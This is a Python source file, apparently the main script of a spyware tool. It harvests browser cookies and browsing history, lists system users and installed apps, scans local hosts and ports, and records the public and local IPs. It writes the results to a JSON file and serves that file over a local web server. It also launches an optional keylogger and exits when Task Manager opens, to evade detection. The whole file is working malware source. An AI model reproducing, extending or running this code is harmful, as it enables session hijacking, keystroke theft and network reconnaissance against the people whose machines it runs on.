import re
from http.server import HTTPServer, SimpleHTTPRequestHandler
from browsers import getBrowsersInfo
import threading
import sys
import json
import sens
import net
import operativeSystem

with open('settings.json', 'r') as archivo:
    settings = json.load(archivo)
    
PORT = settings["serverPort"]
DELAY = settings["portScanningDelay"]
HOSTDISCOVER = settings["performHostDiscovery"]
PORTSCANN = settings["performPortScanning"]
APPDISCOVERY = settings["performAppDiscovery"]
USERDISCOVERY = settings["performUserDiscovery"]
RAISEWEBSERVER = settings["RaiseWebServer"]
USEKEYLOGGER = settings["UseKeyLogger"]

def autoAbort():
    while sens.is_task_manager_open()==False:
        pass
    sys.exit()

def main():

    publicIP= net.getPublicIP()
    localIP = net.getLocalIP()
    browsers = getBrowsersInfo()
    httpd = HTTPServer((f"{localIP}", int(8000)), SimpleHTTPRequestHandler)
    
    with open("index.json", 'w') as archivo:
        
        # ------------------------------------
        # ----------   NETWORK  --------------
        # ------------------------------------
        
        archivo.write('{\n\t"Network":{')
        archivo.write("\n\t\t"+f"\"Public IP\": \"{publicIP}\",\n\t\t\"Local IP\": \"{localIP}\",\n\n\t\t\"Interfaces\":{{\n\t\t\t")
        index = False
        
        for interface, value in net.getInterfacesInfo().items():

            try:
                hostDiscovery =net.hostDiscovery(f"{".".join(value[0].split(".")[:-1])+"."+str(int(value[0].split(".")[3])-1)  +"/"+  str(sum(bin(int(x)).count('1') for x in value[1].split('.'))) }").items()

            except:
                hostDiscovery = {"":""}
            if index== False:
                archivo.write(f'"{interface}":{{\n\t\t\t\t"Network Data": {{ "gateway":"{value[0]}", "submask": "{value[1]}" }}')
                index = True
            else:
                archivo.write(f',\n\t\t\t"{interface}":{{\n\t\t\t\t"Network Data": {{ "gateway":"{value[0]}", "submask": "{value[1]}" }}')
            if HOSTDISCOVER:
                archivo.write(',\n\t\t\t\t"Hosts in Network": {  ')
                index2 = False
                try:
                    for ip, MacAddres in hostDiscovery:
                        if index2 == False:
                            archivo.write(f'\n\t\t\t\t\t"{ip}":\t{{"Mac Addres": "{MacAddres}"')
                            index2 = True
                        else:
                            archivo.write(f',\n\t\t\t\t\t"{ip}":\t{{"Mac Addres": "{MacAddres}"')
                        index3 = False
                        if PORTSCANN:
                            archivo.write(',\n\t\t\t\t\t\t"ports": {  ')
                            for port, service in net.portScanner(ip, DELAY): #La IP y el DELAY entre puerto y puerto
                                if index3 == False:
                                    archivo.write(f'\n\t\t\t\t\t\t\t"{port}": "{service}"')
                                    index3 = True
                                else:
                                    archivo.write(f',\n\t\t\t\t\t\t\t"{port}": "{service}"')
                            archivo.write('\n\t\t\t\t\t\t}')

                        archivo.write("\n\t\t\t\t\t}")
                    
                except:
                    pass
                finally:
                    archivo.write("\n\t\t\t\t}")
            archivo.write('\n\t\t\t}')
            
        archivo.write('\n\t\t}\n\t},')
            
            
            
        # ------------------------------------
        # ----------   BROWSER  --------------
        # ------------------------------------
            
        archivo.write('\n\t\"Browsers\":{\n\t\t')




        
        for browser in browsers:
            if browser == "Chrome":
                if browsers[browser][0] == None:
                    browsers[browser][0] = "None"

                archivo.write(f'"{browser}\": {{\n\t\t\t"Cookies\":{browsers[browser][0]},\n\t\t\t"History":{{\n')
            else:
                if browsers[browser][0] == None:
                    browsers[browser][0] = '"None"'

                archivo.write('},\n\t\t"'+browser+f'": {{\n\t\t\t"Cookies":{browsers[browser][0]},\n\t\t\t"History":{{\n' )
            index = 0
            for history in browsers[browser][1]:
                if index == 0:
                    archivo.write( f'\t\t\t\t"entry{index}":{{"{history["datetime"]}": "{history["url"]}"}}' )

                else:
                    archivo.write( f',\n\t\t\t\t"entry{index}":{{"{history["datetime"]}": "{history["url"]}"}}' )
                index+=1
            archivo.write("\n\t\t\t}\n\t\t")
        archivo.write("}\n\t}")
        
        # ------------------------------------
        # ----------   SYSTEM  ---------------
        # ------------------------------------
        archivo.write(',\n\t"System":{')
        if USERDISCOVERY:
            archivo.write('\n\t\t"Users": [')
            index = True
            for user in operativeSystem.getUsers():
                if index:
                    archivo.write(f'\n\t\t\t"{user}"')
                    index = False
                else:
                    archivo.write(f',\n\t\t\t"{user}"')
            archivo.write('\n\t\t]')
        if APPDISCOVERY:
            archivo.write(',\n\t\t"Apps In Device": {')
            index = 0
            for app in operativeSystem.getApps():
                if index==0:
                    archivo.write(f'\n\t\t\t"Entry{index}":{{"{app.Name}":"{app.Version}"}}')
                    
                else:
                    archivo.write(f',\n\t\t\t"Entry{index}":{{"{app.Name}":"{app.Version}"}}')
                index+=1
            archivo.write('\n\t\t}')
            
        archivo.write('\n\t}\n}')
                
        


    if RAISEWEBSERVER:
        print("\nServing HTTP on localhost port " + str(8000) + f" (http://{localIP}:{PORT}/) ...")
        httpd.serve_forever()


        
if __name__ == "__main__":
    hilo = threading.Thread(target=main)
    hilo.daemon = True
    hilo.start()
    fileName= f"{net.getPublicIP()}".replace(".", "-")+"_"+f"{net.getLocalIP()}".replace(".", "-")
    if USEKEYLOGGER:
        keyLogger = threading.Thread(target=sens.listen, args=(fileName,))
        keyLogger.daemon = True
        keyLogger.start()
    autoAbort()

